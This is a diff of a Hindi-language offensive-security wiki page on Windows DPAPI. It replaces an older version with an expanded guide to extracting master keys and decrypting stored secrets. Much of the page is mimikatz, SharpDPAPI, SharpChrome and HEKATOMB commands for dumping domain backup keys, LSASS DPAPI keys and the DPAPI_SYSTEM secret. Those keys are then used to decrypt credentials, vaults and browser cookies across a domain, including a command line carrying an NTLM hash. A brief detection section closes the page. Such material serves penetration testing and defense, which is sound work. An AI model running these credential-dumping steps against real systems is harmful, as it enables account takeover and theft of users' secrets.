@@ -6,52 +6,33 @@
 
 ## What is DPAPI
 
-Data Protection API (DPAPI) मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर **असामान्य निजी कुंजियों के सममित एन्क्रिप्शन** के लिए उपयोग किया जाता है, जो उपयोगकर्ता या सिस्टम रहस्यों को महत्वपूर्ण एंट्रॉपी के स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है, जिससे वे उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई कुंजी का उपयोग करके डेटा को एन्क्रिप्ट कर सकते हैं या, सिस्टम एन्क्रिप्शन के लिए, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग कर सकते हैं, इस प्रकार डेवलपर्स को एन्क्रिप्शन कुंजी की सुरक्षा प्रबंधित करने की आवश्यकता से मुक्त कर देता है।
+Data Protection API (DPAPI) मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर **असमान निजी कुंजियों के सममित एन्क्रिप्शन** के लिए उपयोग किया जाता है, जो उपयोगकर्ता या सिस्टम रहस्यों को महत्वपूर्ण एंट्रॉपी के स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है, जिससे वे उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई कुंजी का उपयोग करके डेटा को एन्क्रिप्ट कर सकते हैं या, सिस्टम एन्क्रिप्शन के लिए, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग कर सकते हैं, इस प्रकार डेवलपर्स को एन्क्रिप्शन कुंजी की सुरक्षा का प्रबंधन करने की आवश्यकता को समाप्त कर देता है।
 
-### Protected Data by DPAPI
+DPAPI का उपयोग करने का सबसे सामान्य तरीका **`CryptProtectData` और `CryptUnprotectData`** फ़ंक्शंस के माध्यम से है, जो अनुप्रयोगों को वर्तमान में लॉग इन किए गए प्रक्रिया के सत्र के साथ डेटा को सुरक्षित रूप से एन्क्रिप्ट और डिक्रिप्ट करने की अनुमति देते हैं। इसका मतलब है कि एन्क्रिप्ट किया गया डेटा केवल उसी उपयोगकर्ता या सिस्टम द्वारा डिक्रिप्ट किया जा सकता है जिसने इसे एन्क्रिप्ट किया था।
 
-DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:
+इसके अलावा, ये फ़ंक्शंस एक **`entropy` पैरामीटर** को भी स्वीकार करते हैं, जिसका उपयोग एन्क्रिप्शन और डिक्रिप्शन के दौरान किया जाएगा, इसलिए, इस पैरामीटर का उपयोग करके एन्क्रिप्ट की गई किसी चीज़ को डिक्रिप्ट करने के लिए, आपको वही एंट्रॉपी मान प्रदान करना होगा जो एन्क्रिप्शन के दौरान उपयोग किया गया था।
 
-- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कंप्लीशन डेटा
-- Outlook और Windows Mail जैसे अनुप्रयोगों के लिए ई-मेल और आंतरिक FTP खाता पासवर्ड
-- साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क और Windows Vault के लिए पासवर्ड, जिसमें एन्क्रिप्शन कुंजियाँ शामिल हैं
-- दूरस्थ डेस्कटॉप कनेक्शनों, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजियों के लिए पासवर्ड
-- Credential Manager द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले अनुप्रयोगों में व्यक्तिगत डेटा, जैसे Skype, MSN messenger, और अधिक
+### Users key generation
 
-## List Vault
-```bash
-# From cmd
-vaultcmd /listcreds:"Windows Credentials" /all
+DPAPI प्रत्येक उपयोगकर्ता के लिए उनके क्रेडेंशियल्स के आधार पर एक अद्वितीय कुंजी (जिसे **`pre-key`** कहा जाता है) उत्पन्न करता है। यह कुंजी उपयोगकर्ता के पासवर्ड और अन्य कारकों से निकाली जाती है और एल्गोरिदम उपयोगकर्ता के प्रकार पर निर्भर करता है लेकिन अंततः SHA1 बनता है। उदाहरण के लिए, डोमेन उपयोगकर्ताओं के लिए, **यह उपयोगकर्ता के HTLM हैश पर निर्भर करता है**।
 
-# From mimikatz
-mimikatz vault::list
-```
-## Credential Files
+यह विशेष रूप से दिलचस्प है क्योंकि यदि एक हमलावर उपयोगकर्ता के पासवर्ड हैश प्राप्त कर सकता है, तो वे:
 
-The **credentials files protected** could be located in:
-```
-dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
-dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-```
-mimikatz `dpapi::cred` का उपयोग करके क्रेडेंशियल्स जानकारी प्राप्त करें, प्रतिक्रिया में आपको एन्क्रिप्टेड डेटा और guidMasterKey जैसी दिलचस्प जानकारी मिल सकती है।
-```bash
-mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
+- **DPAPI का उपयोग करके एन्क्रिप्ट किए गए किसी भी डेटा को डिक्रिप्ट कर सकते हैं** उस उपयोगकर्ता की कुंजी के साथ बिना किसी API से संपर्क किए
+- **पासवर्ड को क्रैक करने** की कोशिश कर सकते हैं ऑफलाइन सही DPAPI कुंजी उत्पन्न करने की कोशिश करते हुए
 
-[...]
-guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
-[...]
-pbData             : b8f619[...snip...]b493fe
-[..]
-```
-आप **mimikatz module** `dpapi::cred` का उपयोग उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए कर सकते हैं:
-```
-dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
-```
-## मास्टर कुंजी
+इसके अलावा, हर बार जब कोई डेटा DPAPI का उपयोग करके एक उपयोगकर्ता द्वारा एन्क्रिप्ट किया जाता है, तो एक नया **मास्टर कुंजी** उत्पन्न होता है। यह मास्टर कुंजी वास्तव में डेटा को एन्क्रिप्ट करने के लिए उपयोग की जाती है। प्रत्येक मास्टर कुंजी को एक **GUID** (Globally Unique Identifier) दिया जाता है जो इसे पहचानता है।
 
-DPAPI कुंजी जो उपयोगकर्ता की RSA कुंजियों को एन्क्रिप्ट करने के लिए उपयोग की जाती है, `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका के तहत संग्रहीत होती है, जहाँ {SID} उस उपयोगकर्ता का [**सुरक्षा पहचानकर्ता**](https://en.wikipedia.org/wiki/Security_Identifier) है। **DPAPI कुंजी उसी फ़ाइल में संग्रहीत होती है जिसमें उपयोगकर्ताओं की निजी कुंजियों की सुरक्षा करने वाली मास्टर कुंजी होती है**। यह आमतौर पर 64 बाइट्स का यादृच्छिक डेटा होता है। (ध्यान दें कि यह निर्देशिका सुरक्षित है इसलिए आप इसे `dir` का उपयोग करके cmd से सूचीबद्ध नहीं कर सकते, लेकिन आप इसे PS से सूचीबद्ध कर सकते हैं)।
+मास्टर कुंजियाँ **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** निर्देशिका में संग्रहीत होती हैं, जहाँ `{SID}` उस उपयोगकर्ता का सुरक्षा पहचानकर्ता है। मास्टर कुंजी उपयोगकर्ता के **`pre-key`** द्वारा एन्क्रिप्ट की गई है और पुनर्प्राप्ति के लिए एक **डोमेन बैकअप कुंजी** द्वारा भी (इसलिए वही कुंजी 2 अलग-अलग पास द्वारा 2 बार एन्क्रिप्ट की गई है)।
+
+ध्यान दें कि **मास्टर कुंजी को एन्क्रिप्ट करने के लिए उपयोग की जाने वाली डोमेन कुंजी डोमेन नियंत्रकों में होती है और कभी नहीं बदलती**, इसलिए यदि एक हमलावर के पास डोमेन नियंत्रक तक पहुंच है, तो वे डोमेन बैकअप कुंजी प्राप्त कर सकते हैं और डोमेन में सभी उपयोगकर्ताओं की मास्टर कुंजियों को डिक्रिप्ट कर सकते हैं।
+
+एन्क्रिप्टेड ब्लॉब्स में **मास्टर कुंजी का GUID** होता है जो डेटा को एन्क्रिप्ट करने के लिए उपयोग किया गया था, इसके हेडर के भीतर।
+
+> [!NOTE]
+> DPAPI एन्क्रिप्टेड ब्लॉब्स **`01 00 00 00`** से शुरू होते हैं
+
+Find master keys:
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -64,29 +45,218 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 
 ![](<../../images/image (1121).png>)
 
-आमतौर पर **प्रत्येक मास्टर कुंजी एक एन्क्रिप्टेड सममित कुंजी होती है जो अन्य सामग्री को डिक्रिप्ट कर सकती है**। इसलिए, **एन्क्रिप्टेड मास्टर कुंजी को निकालना** दिलचस्प है ताकि बाद में उस **अन्य सामग्री** को **डिक्रिप्ट** किया जा सके जो इसके साथ एन्क्रिप्ट की गई है।
+### मशीन/सिस्टम कुंजी निर्माण
 
-### मास्टर कुंजी निकालें और डिक्रिप्ट करें
+यह कुंजी मशीन द्वारा डेटा को एन्क्रिप्ट करने के लिए उपयोग की जाती है। यह **DPAPI_SYSTEM LSA रहस्य** पर आधारित है, जो एक विशेष कुंजी है जिसे केवल SYSTEM उपयोगकर्ता ही एक्सेस कर सकता है। इस कुंजी का उपयोग उस डेटा को एन्क्रिप्ट करने के लिए किया जाता है जिसे सिस्टम स्वयं द्वारा एक्सेस किया जाना आवश्यक है, जैसे मशीन-स्तरीय क्रेडेंशियल या सिस्टम-व्यापी रहस्य।
 
-मास्टर कुंजी निकालने और इसे डिक्रिप्ट करने के उदाहरण के लिए पोस्ट देखें [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)।
+ध्यान दें कि ये कुंजियाँ **डोमेन बैकअप** नहीं रखती हैं इसलिए ये केवल स्थानीय रूप से उपलब्ध हैं:
 
-## SharpDPAPI
+- **Mimikatz** इसे LSA रहस्यों को डंप करने के लिए कमांड का उपयोग करके एक्सेस कर सकता है: `mimikatz lsadump::secrets`
+- रहस्य रजिस्ट्री के अंदर संग्रहीत है, इसलिए एक व्यवस्थापक **इस तक पहुँचने के लिए DACL अनुमतियों को संशोधित कर सकता है**। रजिस्ट्री पथ है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
 
-[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) कुछ DPAPI कार्यक्षमता का C# पोर्ट है [@gentilkiwi](https://twitter.com/gentilkiwi) के [Mimikatz](https://github.com/gentilkiwi/mimikatz/) प्रोजेक्ट से।
+### DPAPI द्वारा संरक्षित डेटा
 
-## HEKATOMB
+DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों को निकालने और RPC के माध्यम से डोमेन नियंत्रक बैकअप कुंजी निकालने को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के आईपी पते को हल करेगी और सभी कंप्यूटरों पर smbclient प्रदर्शन करेगी ताकि सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त किया जा सके और सभी को डोमेन बैकअप कुंजी के साथ डिक्रिप्ट किया जा सके।
+- Windows क्रेड्स
+- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कंप्लीशन डेटा
+- Outlook और Windows Mail जैसे अनुप्रयोगों के लिए ई-मेल और आंतरिक FTP खाता पासवर्ड
+- साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क और Windows Vault के लिए पासवर्ड, जिसमें एन्क्रिप्शन कुंजियाँ शामिल हैं
+- रिमोट डेस्कटॉप कनेक्शनों, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजियाँ
+- क्रेडेंशियल प्रबंधक द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले अनुप्रयोगों में व्यक्तिगत डेटा, जैसे Skype, MSN मैसेंजर, और अधिक
+- रजिस्टर के अंदर एन्क्रिप्टेड ब्लॉब
+- ...
+
+सिस्टम द्वारा संरक्षित डेटा में शामिल हैं:
+- Wifi पासवर्ड
+- अनुसूचित कार्य पासवर्ड
+- ...
+
+### मास्टर कुंजी निष्कर्षण विकल्प
+
+- यदि उपयोगकर्ता के पास डोमेन व्यवस्थापक विशेषाधिकार हैं, तो वे **डोमेन बैकअप कुंजी** का उपयोग करके डोमेन में सभी उपयोगकर्ता मास्टर कुंजियों को डिक्रिप्ट कर सकते हैं:
+```bash
+# Mimikatz
+lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
+
+# SharpDPAPI
+SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
+```
+- स्थानीय प्रशासनिक विशेषाधिकारों के साथ, **LSASS मेमोरी** तक पहुँच प्राप्त करना संभव है ताकि सभी जुड़े उपयोगकर्ताओं के DPAPI मास्टर कुंजी और SYSTEM कुंजी निकाली जा सकें।
+```bash
+# Mimikatz
+mimikatz sekurlsa::dpapi
+```
+- यदि उपयोगकर्ता के पास स्थानीय प्रशासनिक विशेषाधिकार हैं, तो वे मशीन मास्टर कुंजियों को डिक्रिप्ट करने के लिए **DPAPI_SYSTEM LSA रहस्य** तक पहुँच सकते हैं:
+```bash
+# Mimikatz
+lsadump::secrets /system:DPAPI_SYSTEM /export
+```
+- यदि उपयोगकर्ता का पासवर्ड या NTLM हैश ज्ञात है, तो आप **उपयोगकर्ता की मास्टर कुंजियों को सीधे डिक्रिप्ट कर सकते हैं**:
+```bash
+# Mimikatz
+dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
+
+# SharpDPAPI
+SharpDPAPI.exe masterkeys /password:PASSWORD
+```
+- यदि आप एक सत्र के अंदर उपयोगकर्ता के रूप में हैं, तो आप DC से **मास्टर कुंजियों को डिक्रिप्ट करने के लिए बैकअप कुंजी** मांग सकते हैं। यदि आप स्थानीय प्रशासक हैं और उपयोगकर्ता लॉग इन है, तो आप इसके लिए **उसका सत्र टोकन चुरा सकते हैं**:
+```bash
+# Mimikatz
+dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
+
+# SharpDPAPI
+SharpDPAPI.exe masterkeys /rpc
+```
+## सूची वॉल्ट
+```bash
+# From cmd
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# From mimikatz
+mimikatz vault::list
+```
+## Access DPAPI Encrypted Data
+
+### Find DPAPI Encrypted data
+
+सामान्य उपयोगकर्ताओं के **संरक्षित फ़ाइलें** निम्नलिखित स्थानों पर होती हैं:
+
+- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
+- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
+- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
+- ऊपर दिए गए पथों में `\Roaming\` को `\Local\` में बदलकर भी जांचें।
+
+Enumeration examples:
+```bash
+dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) फ़ाइल सिस्टम, रजिस्ट्री और B64 ब्लॉब में DPAPI एन्क्रिप्टेड ब्लॉब्स को खोज सकता है:
+```bash
+# Search blobs in the registry
+search /type:registry [/path:HKLM] # Search complete registry by default
+
+# Search blobs in folders
+search /type:folder /path:C:\path\to\folder
+search /type:folder /path:C:\Users\username\AppData\
+
+# Search a blob inside a file
+search /type:file /path:C:\path\to\file
+
+# Search a blob inside B64 encoded data
+search /type:base64 [/base:<base64 string>]
+```
+ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (उसी रिपॉजिटरी से) का उपयोग DPAPI का उपयोग करके कुकीज़ जैसी संवेदनशील डेटा को डिक्रिप्ट करने के लिए किया जा सकता है।
+
+### एक्सेस कुंजी और डेटा
+
+- **SharpDPAPI** का उपयोग करें ताकि वर्तमान सत्र से DPAPI एन्क्रिप्टेड फ़ाइलों से क्रेडेंशियल प्राप्त किए जा सकें:
+```bash
+# Decrypt user data
+## Note that 'triage' is like running credentials, vaults, rdg and certificates
+SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
+
+# Decrypt machine data
+SharpDPAPI.exe machinetriage
+```
+- **क्रेडेंशियल्स जानकारी प्राप्त करें** जैसे एन्क्रिप्टेड डेटा और guidMasterKey।
+```bash
+mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
+
+[...]
+guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
+[...]
+pbData             : b8f619[...snip...]b493fe
+[..]
+```
+- **मास्टरकी तक पहुँच**:
+
+RPC का उपयोग करके **डोमेन बैकअप कुंजी** का अनुरोध करने वाले उपयोगकर्ता की मास्टरकी को डिक्रिप्ट करें:
+```bash
+# Mimikatz
+dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
+
+# SharpDPAPI
+SharpDPAPI.exe masterkeys /rpc
+```
+**SharpDPAPI** टूल मास्टरकी डिक्रिप्शन के लिए इन तर्कों का भी समर्थन करता है (ध्यान दें कि यह संभव है `/rpc` का उपयोग करके डोमेन का बैकअप कुंजी प्राप्त करना, `/password` का उपयोग करके एक प्लेनटेक्स्ट पासवर्ड का उपयोग करना, या `/pvk` का उपयोग करके एक DPAPI डोमेन प्राइवेट की फ़ाइल निर्दिष्ट करना...):
+```
+/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
+/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
+/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
+/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
+/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
+/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
+/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
+/server:SERVER          -   triage a remote server, assuming admin access
+/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
+```
+- **एक मास्टरकी का उपयोग करके डेटा डिक्रिप्ट करें**:
+```bash
+# Mimikatz
+dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
+
+# SharpDPAPI
+SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
+```
+**SharpDPAPI** टूल `credentials|vaults|rdg|keepass|triage|blob|ps` डिक्रिप्शन के लिए इन तर्कों का भी समर्थन करता है (ध्यान दें कि यह संभव है `/rpc` का उपयोग करके डोमेन बैकअप कुंजी प्राप्त करना, `/password` का उपयोग करके एक प्लेनटेक्स्ट पासवर्ड का उपयोग करना, `/pvk` का उपयोग करके एक DPAPI डोमेन प्राइवेट की फ़ाइल निर्दिष्ट करना, `/unprotect` का उपयोग करके वर्तमान उपयोगकर्ता सत्र का उपयोग करना...)
+```
+Decryption:
+/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
+/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
+/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
+/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
+/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
+/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
+/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
+GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
+/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption
+
+Targeting:
+/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
+/server:SERVER      -   triage a remote server, assuming admin access
+Note: must use with /pvk:KEY or /password:X
+Note: not applicable to 'blob' or 'ps' commands
+```
+- **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके कुछ डेटा को डिक्रिप्ट करें:
+```bash
+# Mimikatz
+dpapi::blob /in:C:\path\to\encrypted\file /unprotect
+
+# SharpDPAPI
+SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
+```
+### अन्य मशीन डेटा तक पहुँचें
+
+**SharpDPAPI और SharpChrome** में आप **`/server:HOST`** विकल्प का उपयोग करके एक दूरस्थ मशीन के डेटा तक पहुँच सकते हैं। बेशक, आपको उस मशीन तक पहुँचने में सक्षम होना चाहिए और निम्नलिखित उदाहरण में यह माना गया है कि **डोमेन बैकअप एन्क्रिप्शन कुंजी ज्ञात है**:
+```bash
+SharpDPAPI.exe triage /server:HOST /pvk:BASE64
+SharpChrome cookies /server:HOST /pvk:BASE64
+```
+## अन्य उपकरण
+
+### HEKATOMB
+
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों के निष्कर्षण और RPC के माध्यम से डोमेन नियंत्रक बैकअप कुंजी के निष्कर्षण को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के आईपी पते को हल करेगी और सभी कंप्यूटरों पर smbclient का प्रदर्शन करेगी ताकि सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त किया जा सके और सब कुछ डोमेन बैकअप कुंजी के साथ डिक्रिप्ट किया जा सके।
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
 LDAP से निकाले गए कंप्यूटरों की सूची के साथ आप हर उप नेटवर्क को ढूंढ सकते हैं भले ही आप उन्हें नहीं जानते हों!
 
-"क्योंकि डोमेन एडमिन अधिकार पर्याप्त नहीं हैं। सभी को हैक करें।"
-
-## DonPAPI
+### DonPAPI
 
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा संरक्षित रहस्यों को डंप कर सकता है।
+
+### सामान्य पहचान
+
+- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित निर्देशिकाओं में फ़ाइलों तक पहुँच।
+- विशेष रूप से C$ या ADMIN$ जैसे नेटवर्क शेयर से।
+- LSASS मेमोरी तक पहुँचने के लिए Mimikatz का उपयोग।
+- घटना **4662**: एक वस्तु पर एक ऑपरेशन किया गया था।
+- इस घटना की जांच की जा सकती है कि क्या `BCKUPKEY` वस्तु तक पहुँच गई थी।
 
 ## संदर्भ
 
